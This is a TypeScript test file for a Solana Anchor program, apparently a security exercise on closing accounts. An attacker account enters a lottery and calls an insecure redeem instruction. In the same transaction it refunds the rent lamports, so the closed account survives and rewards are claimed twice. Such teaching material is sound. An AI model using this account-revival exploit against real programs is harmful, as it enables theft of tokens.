import * as anchor from "@coral-xyz/anchor";
import { Program, web3 } from "@coral-xyz/anchor";
import { SolanaClosingAccounts } from "../target/types/solana_closing_accounts";
import { safeAirdrop } from "./utils/utils";
import { createMint, getAccount, getOrCreateAssociatedTokenAccount, TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { sendAndConfirmTransaction, SystemProgram, Transaction } from "@solana/web3.js";
import { expect } from "chai";

describe("solana-closing-accounts", () => {
  // Configure the client to use the local cluster.
  anchor.setProvider(anchor.AnchorProvider.env());

  const program = anchor.workspace.SolanaClosingAccounts as Program<SolanaClosingAccounts>;

 // Configure the client to use the local cluster.
 anchor.setProvider(anchor.AnchorProvider.env())
 const provider = anchor.AnchorProvider.env()
//  const program = anchor.workspace.ClosingAccounts as Program<ClosingAccounts>
 const attacker = web3.Keypair.generate()
 let rewardMint: web3.PublicKey
 let mintAuth: web3.PublicKey
 let mint: web3.PublicKey
 let attackerLotteryEntry: web3.PublicKey
 let attackerAta: web3.PublicKey

 before(async () => {
   ;[mint] = await web3.PublicKey.findProgramAddressSync(
     [Buffer.from("mint-seed")],
     program.programId
   )
   mintAuth = mint

   await safeAirdrop(attacker.publicKey, provider.connection)

   rewardMint = await createMint(
     provider.connection,
     attacker,
     mintAuth,
     null,
     6
   )
   ;[attackerLotteryEntry] = await web3.PublicKey.findProgramAddressSync(
     [attacker.publicKey.toBuffer()],
     program.programId
   )

   attackerAta = (
     await getOrCreateAssociatedTokenAccount(
       provider.connection,
       attacker,
       rewardMint,
       attacker.publicKey
     )
   ).address
 })

 it("Enter lottery", async () => {
   // tx to enter lottery
   await program.methods
     .enterLottery()
     .accounts({
       lotteryEntry: attackerLotteryEntry,
       user: attacker.publicKey,
       userAta: attackerAta,
       systemProgram: SystemProgram.programId,
     })
     .signers([attacker])
     .rpc()
 })

 it("attacker  can close + refund lottery acct + claim multiple rewards", async () => {
   // claim multiple times
   for (let i = 0; i < 2; i++) {
     const tx = new Transaction()
     // instruction claims rewards, program will try to close account
     tx.add(
       await program.methods
         .redeemWinningsInsecure()
         .accounts({
           lotteryEntry: attackerLotteryEntry,
           user: attacker.publicKey,
           userAta: attackerAta,
           rewardMint: rewardMint,
           mintAuth: mintAuth,
           tokenProgram: TOKEN_PROGRAM_ID,
         })
         .instruction()
     )

     // user adds instruction to refund dataAccount lamports
     const rentExemptLamports =
       await provider.connection.getMinimumBalanceForRentExemption(
         82,
         "confirmed"
       )
     tx.add(
       SystemProgram.transfer({
         fromPubkey: attacker.publicKey,
         toPubkey: attackerLotteryEntry,
         lamports: rentExemptLamports,
       })
     )
     // send tx
     await sendAndConfirmTransaction(provider.connection, tx, [attacker])
     await new Promise((x) => setTimeout(x, 5000))
   }

   const ata = await getAccount(provider.connection, attackerAta)
   const lotteryEntry = await program.account.lotteryAccount.fetch(
     attackerLotteryEntry
   )

   expect(Number(ata.amount)).to.equal(
     lotteryEntry.timestamp.toNumber() * 10 * 2
   )
 })
})